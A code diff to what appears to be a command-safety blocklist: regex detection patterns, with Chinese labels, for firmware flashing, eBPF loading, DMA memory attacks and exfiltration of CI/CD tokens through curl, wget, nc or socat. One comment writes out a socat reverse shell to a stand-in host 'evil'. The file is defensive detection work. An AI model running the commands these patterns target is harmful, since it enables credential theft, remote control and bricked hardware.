@@ -35,6 +35,19 @@ _CRITICAL_PATTERNS = [
     (r"\bwipefs\b", "wipefs (擦除文件系统签名)"),
     (r"\bshred\b", "shred (安全擦除文件)"),
     (r"\bblkdiscard\b", "blkdiscard (丢弃块设备全部数据, 不可恢复)"),
+    # ---- round22: 固件/VBIOS 刷写 + eBPF 恶意加载 + DMA 物理内存攻击 ----
+    # 固件/VBIOS 刷写工具 (砖机风险 + 供应链后门)
+    (r"\bnvflash\b[^\n]*--write", "nvflash write vbios (刷写 GPU VBIOS 固件, 不可逆)"),
+    (r"\bflashrom\b[^\n]*\s-w\b", "flashrom write firmware (刷写主板/BIOS 固件, 砖机风险)"),
+    (r"\b(afuflash|amiflash|flashrom)\b[^\n]*-p\s+internal", "BIOS internal flash (内部总线刷写固件)"),
+    # eBPF 加载 (内核级权限, 恶意程序可隐藏进程/劫持 syscall)
+    (r"\bbpftool\s+prog\s+load\b", "bpftool prog load (加载 eBPF 程序到内核, 权限提升)"),
+    (r"\bbpftrace\b[^\n]*(?:system\s*\(|execve|override\s+return|signal\s*\()",
+     "bpftrace exec/override (eBPF 探针中执行命令/覆盖返回值, 内核级提权)"),
+    (r"\bbpftool\s+map\s+(?:create|update)\b[^\n]*pin\s+/sys/fs/bpf/", "bpftool map pin (eBPF map 持久化到 bpf fs)"),
+    # DMA 物理内存攻击工具 (绕过 OS 直接读写内存)
+    (r"\bpcileech\b[^\n]*(?:write|read|exec|inject|kmd)", "pcileech DMA (DMA 物理内存读写/内核驱动注入)"),
+    (r"\binception\b[^\n]*--module", "inception DMA (DMA 攻击模块加载)"),
     # ---- 编辑器 / 分页器 shell 逃逸 (vim -c '!cmd' / ex 命令执行) ----
     (r"\b(?:vim|vi|nvim|ex|less|more)\b[^\n]*-c\s*['\"][^'\"]*!",
      "editor shell escape (编辑器 -c 中执行 shell 命令)"),
@@ -240,6 +253,11 @@ _CRITICAL_PATTERNS = [
      "curl exfiltrate sensitive file (数据外泄)"),
     (r"wget\b[^\n]*--post-file=", "wget exfiltrate file (数据外泄)"),
     (r"wget\b[^\n]*--post-data=", "wget exfiltrate data (数据外泄)"),
+    # round22: CI/CD credentials exfil — 环境变量含敏感 token 直接 POST 到外部
+    (r"curl\b[^\n]*-[dTF]\s+\$?(?:\$\{)?(?:GITHUB_TOKEN|GH_TOKEN|GITLAB_TOKEN|SLACK_TOKEN|NPM_TOKEN|AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID|ANTHROPIC_API_KEY|OPENAI_API_KEY|DO_NOT_TRACK_TOKEN)",
+     "curl exfil CI/CD credentials (环境变量 token 直接外传)"),
+    (r"\b(?:echo|printf|cat)\b[^\n]*(?:\$|`\$?\{?)(?:AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID|GITHUB_TOKEN|GH_TOKEN|SLACK_TOKEN|NPM_TOKEN|ANTHROPIC_API_KEY|OPENAI_API_KEY)[^\n]*\|\s*(?:curl|wget|nc|socat)\b",
+     "exfil credentials via pipe (token 经管道发送到外部工具)"),
     # ---- 数据外泄补充 (Gap-2026-11b): 网络工具把敏感文件/凭证发送到外部 ----
     # ① socat 双向通道 / 反弹 shell / 传输: socat TCP:evil:4444 EXEC:/bin/sh 或
     #    把本地数据经 socat 送到远程。
